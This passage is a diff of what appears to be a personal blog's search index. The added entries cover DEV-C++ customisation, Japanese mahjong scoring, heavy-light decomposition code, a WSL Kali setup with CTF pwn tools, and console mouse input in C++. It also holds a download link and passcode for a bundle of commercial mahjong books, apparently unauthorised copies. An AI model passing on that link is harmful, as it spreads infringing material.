-<th>Ubuntu版本</th>
-<th>libc版本</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Oracular（Ubuntu 24.10）</td>
-<td>2.40-1ubuntu3——2.39-0ubuntu8.1</td>
-</tr>
-<tr>
-<td>Noble（Ubuntu 24.04 LTS）</td>
-<td>2.39-0ubuntu8.3——2.38-1ubuntu6</td>
-</tr>
-<tr>
-<td>Jammy（Ubuntu 22.04 LTS）</td>
-<td>2.35-0ubuntu3.8——2.34-0ubuntu3</td>
-</tr>
-<tr>
-<td>Focal（Ubuntu 20.04 LTS）</td>
-<td>2.31-0ubuntu9.16——2.30-0ubuntu2</td>
-</tr>
-</tbody></table>
-<ul>
-<li>Step 3</li>
-</ul>
-<p>下载好对应的.deb包之后，使用以下命令解压缩</p>
-<pre><code class="highlight bash">dpkg -X xxxx.deb ./libc</code></pre>
-
-]]></content>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>渗透攻击</title>
-    <url>/2025/03/17/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB/</url>
-    <content><![CDATA[<blockquote>
-<p>主要基于书籍《kali linux 2网络渗透测试实践指南》</p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>kali</tag>
-      </tags>
   </entry>
   <entry>
     <title>学习使用世界上最好的godot游戏引擎</title>
@@ -505,69 +319,1300 @@ GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.8) stable release version 2.35. <span 
       </tags>
   </entry>
   <entry>
-    <title>编写漏洞渗透模块</title>
-    <url>/2025/03/17/%E7%BC%96%E5%86%99%E6%BC%8F%E6%B4%9E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97/</url>
-    <content><![CDATA[<blockquote>
-<p>主要基于书籍《kali linux 2网络渗透测试实践指南》</p>
+    <title>带你玩转DEV-C++</title>
+    <url>/2024/10/31/%E5%B0%86DEV-C-%E7%BC%96%E8%BE%91%E5%99%A8%E6%89%93%E9%80%A0%E6%88%90%E7%A5%9E%E7%BA%A7IDE%E5%8F%8A%E7%BE%8E%E5%8C%96/</url>
+    <content><![CDATA[<h1 id="头记"><a href="#头记" class="headerlink" title="头记"></a>头记</h1><p>鉴于使用<code>原版DEV-C++</code>不得不说十分滞后，人家<code>Visual Studio</code>多高端，本人写下此文章,使用一些奇技淫巧，美化和增强此IDE，个人认为可以和<code>Visual Studio</code>相媲美</p>
+<h1 id="样式美化"><a href="#样式美化" class="headerlink" title="样式美化"></a>样式美化</h1><p><img src="https://cdn.luogu.com.cn/upload/image_hosting/vttuwku5.png" alt="预览"></p>
+<ol>
+<li><p>点击顶部菜单栏<code>工具</code></p>
+</li>
+<li><p>点击下拉列表中的<code>编译器选项</code></p>
+</li>
+<li><p>点击新弹出的窗口中的<code>基本</code></p>
+</li>
+<li><p>取消勾选<code>高亮显示当前行</code>，或者后面你再选择你喜欢的颜色。</p>
+</li>
+<li><p>点击还是这个窗口中的<code>语法</code>（和“基本”在同一排）</p>
+</li>
+<li><p>选择<code>预设</code>为 Obsidian，保存一下再进行以下修改</p>
+</li>
+<li><p>修改以下几个地方：（都只改前景和样式，背景不改，改完记得点确定）</p>
+</li>
+</ol>
+<blockquote>
+<p>Preprocessor: （自定义）红136+绿99+蓝173+下划线</p>
+<p>Reserved Word： （自定义）红106+绿185+蓝255+下划线</p>
+<p>Identifier： Silver</p>
+<p>String：（自定义）红255+绿128+蓝128</p>
+<p>Symbol：（自定义）同上String</p>
 </blockquote>
+<h1 id="取消完成符号（个人喜好）"><a href="#取消完成符号（个人喜好）" class="headerlink" title="取消完成符号（个人喜好）"></a>取消完成符号（个人喜好）</h1><ol>
+<li><p>点击顶部菜单栏<code>工具</code>-&gt;点击<code>编译器选项</code></p>
+</li>
+<li><p>点击新弹出的窗口中的<code>代码补全</code></p>
+</li>
+<li><p>点击<code>完成符号</code></p>
+</li>
+<li><p>取消勾选<code>启用符号配对</code></p>
+</li>
+</ol>
+<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/1ijwn1cy.png"></p>
+<h1 id="编译选项优化"><a href="#编译选项优化" class="headerlink" title="编译选项优化"></a>编译选项优化</h1><ol>
+<li><p>点击顶部菜单栏<code>工具</code></p>
+</li>
+<li><p>点击下拉列表中的<code>编译选项</code></p>
+</li>
+<li><p>点击新弹出的窗口中的<code>代码生成/优化</code></p>
+</li>
+<li><p>点击<code>代码警告</code></p>
+</li>
+<li><p>设<code>显示最多警告信息（-Wall）</code>为Yes</p>
+</li>
+<li><p>(有必要的可以设“显示所有警告为错误（-Werror）”为Yes)</p>
+</li>
+</ol>
+<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/mf2j4j60.png" alt="像这样"></p>
+<h1 id="使用自己的mingw-w64"><a href="#使用自己的mingw-w64" class="headerlink" title="使用自己的mingw-w64"></a>使用自己的mingw-w64</h1><p>（Dev-C++ 5.11自带的mingw-w64的版本才4.9.2，我们可以使用自己最新版的mingw-w64，目前是8.1.0）</p>
+<ol>
+<li><p>mingw-w64的下载安装教程,在<a href="https://www.luogu.com.cn/blog/sky-fox/post-an-li-sublime-text-3-pei-zhi-cjava-kai-fa-huan-jing">这里</a>有</p>
+</li>
+<li><p>打开Dev-C++过程中一定不要关闭</p>
+</li>
+<li><p>打开你Dev-C++安装的位置（默认在C:\Program Files (x86)\Dev-Cpp）</p>
+</li>
+<li><p>用你的MinGW64覆盖掉自带的MinGW64的文件夹</p>
+</li>
+<li><p>然后点击Dev-C++菜单栏 <code>文件</code> -&gt; <code> 编译选项</code> -&gt; 点击 <code>目录</code></p>
+</li>
+<li><p>点击<code>C包含文件</code>和<code>C++包含文件</code></p>
+</li>
+<li><p>把里面路径所有的4.9.2换成8.1.0（即你所用的版本）</p>
+</li>
+<li><p>然后重新打开Dev-C++进行配置</p>
+</li>
+</ol>
+<p>修改样例（修改后点击替换）:</p>
+<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/9ms6hwzz.png"></p>
+<p><strong>注</strong>：如果你过程中关闭了Dev-C++重新打开时他会提示你“<strong>路径无效，是否删除无效路径</strong>”请选择<strong>否</strong>，不然你的许多头文件会用不了</p>
+<p>接下来配置一下</p>
+<ul>
+<li><p>点击Dev-C++菜单栏 <code>文件</code> -&gt; <code>编译选项</code> 点击上方两个加号处</p>
+</li>
+<li><p>点击Yes或No，点击Yes就会清空原有列表，点击No就会保留原来列表，建议清空（建议点击Yes）</p>
+</li>
+<li><p>如果会生成一个新列表，说明配置成功了,像这样</p>
+</li>
+</ul>
+<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/5eebhg9a.png"><br><img src="https://cdn.luogu.com.cn/upload/image_hosting/vdtluh48.png"></p>
+<h1 id="格式化修改"><a href="#格式化修改" class="headerlink" title="格式化修改"></a>格式化修改</h1><ol>
+<li><p>点击顶部菜单栏<code>AStyle</code></p>
+</li>
+<li><p>点击下拉列表中的<code>格式化选项</code></p>
+</li>
+<li><p>选择<code>选项——括号风格</code>为Allman（个人喜欢）（默认的Java也还行）</p>
+</li>
+<li><p>在编辑代码的时候按Ctrl+Shift+A就可以自动格式化啦</p>
+</li>
+</ol>
+<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/o8x9q60g.png" alt="预览"></p>
+<h1 id="设置透明编辑器"><a href="#设置透明编辑器" class="headerlink" title="设置透明编辑器"></a>设置透明编辑器</h1><p><img src="https://cdn.luogu.com.cn/upload/image_hosting/9ztt3tra.png" alt="预览"></p>
+<ol>
+<li><p>点击<a href="https://files.cnblogs.com/files/fox-nest/Glass2k.rar">这里</a>下载<a href="https://files.cnblogs.com/files/fox-nest/Glass2k.rar">Glass2k程序</a></p>
+</li>
+<li><p>解压并打开<code>Glass2k.exe</code>(怎么都是英文的？！别怕)</p>
+</li>
+<li><p>如果没有显示界面那就看看任务栏右下角有没有三个箱子堆起来的图标，右键点<code>Settings</code></p>
+</li>
+<li><p>有三个勾选框，简单翻译一下，第一个是开机启动，第二个是记住透明度设置，第三个是深度使用该软件（建议勾选第二和第三个）（下面那个蓝蓝的条是用来设置任务栏的透明度的）</p>
+</li>
+<li><p>接下来为了避免鼠标按键冲突，设置<code>Right Click</code>: <code>+ Ctrl + Shift</code></p>
+</li>
+<li><p>然后打开DEV-C++，按着<code>Ctrl + Shift + 右键</code>点击DEV-C++窗口的任意地方，就会出现一个列表，选择你想要的透明度就可以啦（建议设置80%）</p>
+</li>
+</ol>
+<ul>
+<li>可以按照下图修改</li>
+</ul>
+<p><img src="https://cdn.luogu.com.cn/upload/image_hosting/0gbn318e.png" alt="预览"></p>
+<p>（PS:这个软件也可以用在其他一些地方哦，如：浏览器，文件夹等）</p>
+<h1 id="一些快捷键"><a href="#一些快捷键" class="headerlink" title="一些快捷键"></a>一些快捷键</h1><ol>
+<li><p>f9编译，f10运行，f11编译运行（这个应该不用我多说）</p>
+</li>
+<li><p>f5调试（记得把设定编译器配置改为TDM-GCC 4.9.2 64-bit Debug），F7下一步，F8单步进入（这个应该也不用我多说）</p>
+</li>
+<li><p>Ctrl+f11全屏&#x2F;取消全屏，样例：<br><img src="https://cdn.luogu.com.cn/upload/image_hosting/xv7z3idp.png"></p>
+</li>
+<li><p>当你打开了两个文件时，让你的页面停留在一个文件，按Ctrl+M就可以把另一个文件在新的页面打开，样例:<br><img src="https://cdn.luogu.com.cn/upload/image_hosting/klowtiln.png"></p>
+</li>
+</ol>
+<h1 id="最后的一些话"><a href="#最后的一些话" class="headerlink" title="最后的一些话"></a>最后的一些话</h1><p>Dev-C++跟目前的主流代码编辑器相比已被拉开巨大的差距，但</p>
+<p><strong>文章到此就结束了，还在持续更新，给个赞再走呗</strong></p>
 ]]></content>
       <tags>
-        <tag>kali</tag>
+        <tag>DEV-C++</tag>
       </tags>
   </entry>
   <entry>
-    <title>社会工程学工具</title>
-    <url>/2025/03/17/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6%E5%B7%A5%E5%85%B7/</url>
-    <content><![CDATA[<blockquote>
-<p>主要基于书籍《kali linux 2网络渗透测试实践指南》</p>
+    <title>日本麻将资料整理</title>
+    <url>/2023/07/06/%E6%97%A5%E6%9C%AC%E9%BA%BB%E5%B0%86%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86/</url>
+    <content><![CDATA[<p><strong>书名一览（若要保证浏览体验，请关闭翻译）</strong></p>
+<blockquote>
+<p>《ASAPIN 天才雀士に麻雀のことを聞いたらバカ勝ちできた》<br>《Guzaku 傑作「何切る」300選》<br>《Guzaku 定石「何切る」301選》<br>《owata 三人麻雀の極意》<br>《ZERO ゼロ秒思考の麻雀》<br>《ZERO 麻雀強者の0秒思考》<br>《かにマジン 日本一麻雀が強いサラリーマンの必勝法》<br>《きよ アマチュア地方最強位が作る新麻雀マニュアル》<br>《みーにん 「統計学」のマージャン戦術》<br>《みーにん 知るだけで強くなる麻雀の2択》<br>《ゆうせー 実戦でよく出る!麻雀講義》<br>《中島準也 理論的思考で勝つ麻雀》<br>《二階堂亜樹 勝てる麻雀の基本》<br>《土井泰昭 勝つ人は知っている現代麻雀30の新常識》<br>《土田浩翔 運を育てる》<br>《堀内正人 麻雀の麒麟児の一打》<br>《堀慎吾 麻雀だから君は負けるんです》<br>《多井隆晴 多井熱》<br>《小林剛 スーパーデジタル麻雀》<br>《川村晃裕 麻雀勝ち組の鳴きテクニック》<br>《平澤元気 よくわかる麻雀の勝ち方》<br>《平澤元気 現代麻雀の秘技相手に対応させる技術》<br>《平澤元気 絶対にラスを引かない麻雀ラス回避35の技術》<br>《日本プロ麻雀連盟 麻雀基本手筋コレクション》<br>《朝倉康心 麻雀の失敗学》<br>《比嘉秀仁 強者の最近手筋100》<br>《水上直紀 麻雀AI戦術》<br>《独歩 序盤の鉄戦略》<br>《独歩 鉄押しの条件》<br>《石橋伸洋 進化するデジタル麻雀》<br>《石橋伸洋 黒いデジタル麻雀》<br>《福地誠 これだけで勝てる!麻雀の基本形80》<br>《福地誠 手作りと押し引きの鉄戦術》<br>《福地誠 麻雀10倍勝てるテクニック》<br>《福地誠 麻雀の正解》<br>《福地誠 麻雀テクニック》<br>《福地誠 麻雀勝ち組の選択》<br>《福地誠 麻雀勝ち組の選択II》<br>《菊池翔 絶対に負けない最強麻雀戦術》<br>《藤田晋 仕事が麻雀で麻雀が仕事》<br>《近代麻雀 プロに挑戦!!麻雀検定》<br>《近代麻雀 麻雀プロMリーグ選手名鑑》<br>《近藤誠一 大きく打ち大きく勝つ麻雀》<br>《鈴木たろう ゼウスの選択》<br>《馬場裕一 バビーのメンチン何切る》<br>《鳳南研究所 現代麻雀の神ワザ》</p>
 </blockquote>
+<h2 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接"></a>下载链接</h2><p><strong>资料来源于网络</strong></p>
+<p><strong>仅供交流学习使用，不得用于任何商业用途</strong></p>
+<p><a href="https://cowtransfer.com/s/cc797d6a256440">https://cowtransfer.com/s/cc797d6a256440</a> 点击链接查看 【 PDF.zip 】 ，或访问奶牛快传 cowtransfer.com 输入传输口令 f4jzju 查看；</p>
 ]]></content>
       <tags>
-        <tag>kali</tag>
+        <tag>日本麻将</tag>
       </tags>
   </entry>
   <entry>
-    <title>网络数据的嗅探与欺骗</title>
-    <url>/2025/03/17/%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E7%9A%84%E5%97%85%E6%8E%A2%E4%B8%8E%E6%AC%BA%E9%AA%97/</url>
+    <title>日本麻将算符表</title>
+    <url>/2024/02/08/%E6%97%A5%E6%9C%AC%E9%BA%BB%E5%B0%86%E7%AE%97%E7%AC%A6%E8%A1%A8/</url>
     <content><![CDATA[<blockquote>
-<p>主要基于书籍《kali linux 2网络渗透测试实践指南》</p>
+<p>符&#x3D;20（基底符）+各牌组的符数+和牌方式<br>个位不为0的用进一法进到十位</p>
 </blockquote>
+<h2 id="牌组的符数"><a href="#牌组的符数" class="headerlink" title="牌组的符数"></a>牌组的符数</h2><table>
+<thead>
+<tr>
+<th align="center">刻子</th>
+<th align="center">暗</th>
+<th align="center">幺九</th>
+<th align="center">杠</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">2</td>
+<td align="center">(累乘)*2</td>
+<td align="center">(累乘)*2</td>
+<td align="center">(累乘)*4</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">雀头</th>
+<th align="center">顺子</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">2*番数</td>
+<td align="center">0</td>
+</tr>
+</tbody></table>
+<h2 id="和牌方式"><a href="#和牌方式" class="headerlink" title="和牌方式"></a>和牌方式</h2><table>
+<thead>
+<tr>
+<th align="center">门清前放铳</th>
+<th align="center">自摸</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">10</td>
+<td align="center">2</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">平和自摸</th>
+<th align="center">平和放铳</th>
+<th align="center">特殊牌型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">20（固定）</td>
+<td align="center">30（固定）</td>
+<td align="center">25（固定）</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">边张（单骑）</th>
+<th align="center">嵌张（单骑）</th>
+<th align="center">雀头（单骑）</th>
+<th align="center">双碰（非单骑）</th>
+<th align="center">两面（非单骑）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">2</td>
+<td align="center">2</td>
+<td align="center">2</td>
+<td align="center">0</td>
+<td align="center">0</td>
+</tr>
+</tbody></table>
+<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><p><a href="https://lietxia.github.io/fupractice.html">https://lietxia.github.io/fupractice.html</a></p>
 ]]></content>
       <tags>
-        <tag>kali</tag>
+        <tag>日本麻将</tag>
       </tags>
   </entry>
   <entry>
-    <title>被动扫描</title>
-    <url>/2025/03/17/%E8%A2%AB%E5%8A%A8%E6%89%AB%E6%8F%8F/</url>
-    <content><![CDATA[<blockquote>
-<p>主要基于书籍《kali linux 2网络渗透测试实践指南》</p>
-</blockquote>
-]]></content>
+    <title>树链剖分</title>
+    <url>/2025/04/11/%E6%A0%91%E9%93%BE%E5%89%96%E5%88%86/</url>
+    <content><![CDATA[<h1 id="算法目的"><a href="#算法目的" class="headerlink" title="算法目的"></a>算法目的</h1><p>维护静态树上的路径信息</p>
+<h1 id="算法流程"><a href="#算法流程" class="headerlink" title="算法流程"></a>算法流程</h1><p>分两次DFS预处理出以下关键值：</p>
+<table>
+<thead>
+<tr>
+<th>DFS</th>
+<th>值</th>
+<th>含义</th>
+<th>获得方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>father[x]</td>
+<td>x在树中的父亲</td>
+<td>在dfs传参中获得</td>
+</tr>
+<tr>
+<td>1</td>
+<td>dep[x]</td>
+<td>x在树中的深度</td>
+<td>在dfs传参中获得</td>
+</tr>
+<tr>
+<td>1</td>
+<td>size[x]</td>
+<td>x为根的子树大小</td>
+<td>在dfs传递归中获得</td>
+</tr>
+<tr>
+<td>1</td>
+<td>son[x]</td>
+<td>x的重儿子编号</td>
+<td>在dfs传递归中获得</td>
+</tr>
+<tr>
+<td>2</td>
+<td>top[x]</td>
+<td>x所在的重路径的顶部结点编号</td>
+<td>top[重儿子]&#x3D;top[自己]<br>top[轻儿子]&#x3D;轻儿子</td>
+</tr>
+<tr>
+<td>2</td>
+<td>seg[x]</td>
+<td>x在线段树中的位置</td>
+<td>按照先访问重儿子的顺序先序遍历树，使得每条重链上的节点在线段树上保持相邻</td>
+</tr>
+<tr>
+<td>2</td>
+<td>rev[y]</td>
+<td>y在树中的结点编号</td>
+<td>这个简单</td>
+</tr>
+</tbody></table>
+<p>线段树的建树和查询的实现就只需按一般的做法</p>
+<p>树链的查询</p>
+<pre><code class="highlight cpp"><span class="function"><span class="type">void</span> <span class="title">ask</span> <span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>
+<span class="function"></span>&#123;
+    <span class="type">int</span> fx = top[x],fy = top[y];
+    <span class="keyword">while</span>(fx != fy)							<span class="comment">//直到两个点在同一条重链上</span>
+    &#123;
+        <span class="keyword">if</span>(dep[fx] &lt; dep[fy]) 				<span class="comment">//选择深度大的往上跳</span>
+            <span class="built_in">swap</span>(x, y),<span class="built_in">swap</span>(fx, fy);
+        <span class="built_in">query</span>(<span class="number">1</span>, <span class="number">1</span>, seg[<span class="number">0</span>], seg[fx], seg[x]);	
+        x = father[fx]; fx=top[x];
+    &#125;
+    <span class="keyword">if</span>(dep[x] &gt; dep[y]) 					<span class="comment">//先序遍历导致：在同一棵子树上深度大的点在线段树中的位置靠后</span>
+        <span class="built_in">swap</span>(x, y);
+    <span class="built_in">query</span>(<span class="number">1</span>, <span class="number">1</span>, seg[<span class="number">0</span>], seg[x], seg[y])		<span class="comment">//而seg[x]&lt;=seg[y]故dep[x]&lt;=dep[y]</span>
+&#125;</code></pre>]]></content>
       <tags>
-        <tag>kali</tag>
+        <tag>Algorithm</tag>
       </tags>
   </entry>
   <entry>
-    <title>远程控制</title>
-    <url>/2025/03/17/%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
+    <title>毒瘤的WSL+Kali+Pwn环境杂记</title>
+    <url>/2024/12/11/%E6%AF%92%E7%98%A4%E7%9A%84WSL%E6%9D%82%E8%AE%B0/</url>
     <content><![CDATA[<blockquote>
-<p>主要基于书籍《kali linux 2网络渗透测试实践指南》</p>
+<p>被毒瘤的WSL给整麻了</p>
 </blockquote>
+<h2 id="删除已安装好的Linux-发行版"><a href="#删除已安装好的Linux-发行版" class="headerlink" title="删除已安装好的Linux 发行版"></a>删除已安装好的Linux 发行版</h2><pre><code class="highlight plaintext">wsl --unregister kali-linux</code></pre>
+
+<p>一定要卸干净了，重启后再开始后续的安装</p>
+<h2 id="安装Kali-Linux-WSL发行版"><a href="#安装Kali-Linux-WSL发行版" class="headerlink" title="安装Kali-Linux WSL发行版"></a>安装Kali-Linux WSL发行版</h2><p>打开Microsoft Store搜索Kali并安装</p>
+<h2 id="选择默认打开的WSL发行版"><a href="#选择默认打开的WSL发行版" class="headerlink" title="选择默认打开的WSL发行版"></a>选择默认打开的WSL发行版</h2><p>首先查看已安装的所有的lWSL发行版</p>
+<pre><code class="highlight plaintext">wsl --list --verbose</code></pre>
+
+<p>选择默认的WSL发行版</p>
+<pre><code class="highlight plaintext">wsl --set-default kali-linux</code></pre>
+
+<h2 id="将WSL发行版安装到其他的盘"><a href="#将WSL发行版安装到其他的盘" class="headerlink" title="将WSL发行版安装到其他的盘"></a>将WSL发行版安装到其他的盘</h2><pre><code class="highlight plaintext">wsl -l -v
+wsl --export kali-linux D:\kali-linux.tar
+wsl --unregister kali-linux
+wsl --import kali-linux D:\wsl-kali-linux D:\kali-linux.tar --version 2</code></pre>
+
+
+
+<h2 id="安装Kali完整版"><a href="#安装Kali完整版" class="headerlink" title="安装Kali完整版"></a>安装Kali完整版</h2><p>kali-linux的官方源在国内访问通常较慢，不换源装几个小时，换源装十几分钟，自己看着办吧。</p>
+<pre><code class="highlight shell">sudo vi /etc/apt/sources.list</code></pre>
+
+<p>然后会进入vi编辑器（需要一点vi的基础，不过没关系，需要的都已经标出来了），这里给的是中科大源</p>
+<pre><code class="highlight shell"><span class="meta prompt_">#</span><span class="language-bash">按i进入编辑</span>
+deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free non-free-firmware contrib
+deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free non-free-firmware contrib
+<span class="meta prompt_">#</span><span class="language-bash">按esc,然后按依次按:wq</span></code></pre>
+
+<p>更新并安装工具包</p>
+<pre><code class="highlight shell">sudo apt update &amp;&amp; sudo apt upgrade
+sudo apt install -y kali-linux-default # 标准工具包
+sudo apt install -y kali-linux-large # 巨大工具包
+<span class="meta prompt_"># </span><span class="language-bash">-y表示<span class="built_in">yes</span></span></code></pre>
+
+<h2 id="WSL下做Pwn题的必备工具"><a href="#WSL下做Pwn题的必备工具" class="headerlink" title="WSL下做Pwn题的必备工具"></a>WSL下做Pwn题的必备工具</h2><pre><code class="highlight bash"><span class="comment"># apt</span>
+apt install python3-pwntools
+apt install ROPgadget
+apt install checksec
+apt install tmux <span class="comment">#用来解决不能gdb.attach的问题</span>
+
+git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git
+<span class="built_in">cd</span> LibcSearcher
+python setup.py develop
+
+git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg.git
+<span class="built_in">cd</span> pwndbg
+./setup.sh</code></pre>
+
+
+
 ]]></content>
+  </entry>
+  <entry>
+    <title>用C++读取鼠标在控制台上的操作</title>
+    <url>/2023/07/07/%E7%94%A8C-%E8%AF%BB%E5%8F%96%E9%BC%A0%E6%A0%87%E5%9C%A8%E6%8E%A7%E5%88%B6%E5%8F%B0%E4%B8%8A%E7%9A%84%E6%93%8D%E4%BD%9C/</url>
+    <content><![CDATA[<p>与读取键盘信息类似，读取鼠标信息也是通过 <code>ReadConsoleInput</code> 函数来实现</p>
+<p>咱先说一下需要用到的头文件：</p>
+<pre><code class="highlight cpp"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></code></pre>
+
+<p>响应鼠标点击事件的变量类型</p>
+<pre><code class="highlight cpp">INPUT_RECORD</code></pre>
+
+
+<p>咱先介绍一下<code>ReadConsoleInput</code>这个函数</p>
+<pre><code class="highlight cpp"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_MOUSE_EVENT_RECORD</span> &#123; 
+		COORD dwMousePosition;		<span class="comment">// 当前鼠标位置</span>
+		DWORD dwButtonState;		<span class="comment">// 鼠标按钮状态</span>
+		DWORD dwControlKeyState;	<span class="comment">// 键盘控制键状态</span>
+		DWORD dwEventFlags; 		<span class="comment">// 事件状态</span>
+&#125; MOUSE_EVENT_RECORD;
+<span class="comment">//这个东西一般都在&quot;INPUT_RECORD的变量名.Event.MouseEvent.以上变量&quot;</span></code></pre>
+<p>1.第一个参数存放鼠标的位置信息，类型为 COORD 坐标类型；</p>
+<p>2.第二个参数（dwButtonState）为鼠标的按键状态，包含的值如下:</p>
+<table>
+<thead>
+<tr>
+<th align="left">鼠标按键状态码（dwButtonState）</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">FROM_LEFT_1ST_BUTTON_PRESSED</td>
+<td align="left">最左边按键</td>
+</tr>
+<tr>
+<td align="left">FROM_LEFT_2ND_BUTTON_PRESSED</td>
+<td align="left">左起第二个按键</td>
+</tr>
+<tr>
+<td align="left">FROM_LEFT_3RD_BUTTON_PRESSED</td>
+<td align="left">左起第三个按键</td>
+</tr>
+<tr>
+<td align="left">FROM_LEFT_4TH_BUTTON_PRESSED</td>
+<td align="left">左起第四个按键</td>
+</tr>
+<tr>
+<td align="left">RIGHTMOST_BUTTON_PRESSED</td>
+<td align="left">最右边按键</td>
+</tr>
+</tbody></table>
+<p>3.第三个参数是键盘控制键状态，这个和上一章的内容是一样的；</p>
+<p>4.最后一个参数（dwEventFlag）为事件状态：</p>
+<table>
+<thead>
+<tr>
+<th align="left">事件状态码（dwEventFlag）</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">DOUBLE_CLICK</td>
+<td align="left">双击</td>
+</tr>
+<tr>
+<td align="left">MOUSE_MOVED</td>
+<td align="left">移动</td>
+</tr>
+<tr>
+<td align="left">MOUSE_WHEELED</td>
+<td align="left">滚轮滚动（只适用于Windows 2000&#x2F;XP）</td>
+</tr>
+</tbody></table>
+<p>在程序开头应加上</p>
+<pre><code class="highlight cpp">HANDLE hOut = <span class="built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);
+HANDLE hIn = <span class="built_in">GetStdHandle</span>(STD_INPUT_HANDLE);
+<span class="comment">//这是用来添加鼠标输入设备的</span></code></pre>
+
+<p>用法举例</p>
+<pre><code class="highlight cpp"><span class="comment">//我写的一个简单地例子</span>
+<span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span>
+<span class="keyword">using</span> <span class="keyword">namespace</span> std;
+<span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>
+<span class="function"></span>&#123;
+	HANDLE hOut = <span class="built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);
+	HANDLE hIn = <span class="built_in">GetStdHandle</span>(STD_INPUT_HANDLE);
+
+	CONSOLE_SCREEN_BUFFER_INFO bInfo;
+	INPUT_RECORD mouseRec;
+	DWORD res;
+
+	<span class="keyword">while</span>(<span class="number">1</span>)
+	&#123;
+		<span class="built_in">ReadConsoleInput</span>(hIn, &amp;mouseRec, <span class="number">1</span>, &amp;res);<span class="comment">//读取一个鼠标操作</span>
+		<span class="keyword">if</span>(mouseRec.Event.MouseEvent.dwButtonState==FROM_LEFT_1ST_BUTTON_PRESSED)<span class="comment">//如果点击了左键</span>
+		&#123;
+			<span class="keyword">if</span> (mouseRec.Event.MouseEvent.dwEventFlags == DOUBLE_CLICK)<span class="comment">//如果是双击</span>
+			&#123;
+				<span class="keyword">break</span>;	<span class="comment">//退出循环</span>
+			&#125;
+			<span class="keyword">else</span><span class="comment">//单击的情况</span>
+			&#123;
+				cout&lt;&lt;mouseRec.Event.MouseEvent.dwMousePosition.X&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;mouseRec.Event.MouseEvent.dwMousePosition.Y&lt;&lt;endl;<span class="comment">//输出当前鼠标的位置</span>
+			&#125;
+		&#125;
+	&#125;
+	<span class="built_in">CloseHandle</span>(hOut);  <span class="comment">// 关闭标准输出设备句柄  </span>
+	<span class="built_in">CloseHandle</span>(hIn);   <span class="comment">// 关闭标准输入设备句柄  </span>
+&#125;</code></pre>
+<p>摘自网络</p>
+<pre><code class="highlight cpp"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span>  </span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span>
+ 
+<span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span>  </span>
+<span class="function"></span>&#123;  
+	<span class="comment">// 获取标准输入输出设备句柄  </span>
+	HANDLE hOut = <span class="built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);        
+	HANDLE hIn = <span class="built_in">GetStdHandle</span>(STD_INPUT_HANDLE); 
+	CONSOLE_SCREEN_BUFFER_INFO bInfo;
+	INPUT_RECORD	mouseRec;
+	DWORD			res;
+	COORD			crPos, crHome = &#123;<span class="number">0</span>, <span class="number">0</span>&#125;;
+	<span class="built_in">printf</span>(<span class="string">&quot;[Cursor Position] X: %2lu  Y: %2lu\n&quot;</span>, <span class="number">0</span>, <span class="number">0</span>);	<span class="comment">// 初始状态</span>
+	<span class="keyword">while</span> (<span class="number">1</span>)
+	&#123;
+		<span class="built_in">ReadConsoleInput</span>(hIn, &amp;mouseRec, <span class="number">1</span>, &amp;res);
+ 
+		<span class="keyword">if</span> (mouseRec.EventType == MOUSE_EVENT)
+		&#123;
+			<span class="keyword">if</span> (mouseRec.Event.MouseEvent.dwButtonState==FROM_LEFT_1ST_BUTTON_PRESSED)
+			&#123;
+				<span class="keyword">if</span> (mouseRec.Event.MouseEvent.dwEventFlags == DOUBLE_CLICK)
+				&#123;
+					<span class="keyword">break</span>;	<span class="comment">// 左键双击 退出循环</span>
+				&#125;
+			&#125;			
+			crPos = mouseRec.Event.MouseEvent.dwMousePosition;
+			<span class="built_in">GetConsoleScreenBufferInfo</span>(hOut, &amp;bInfo);
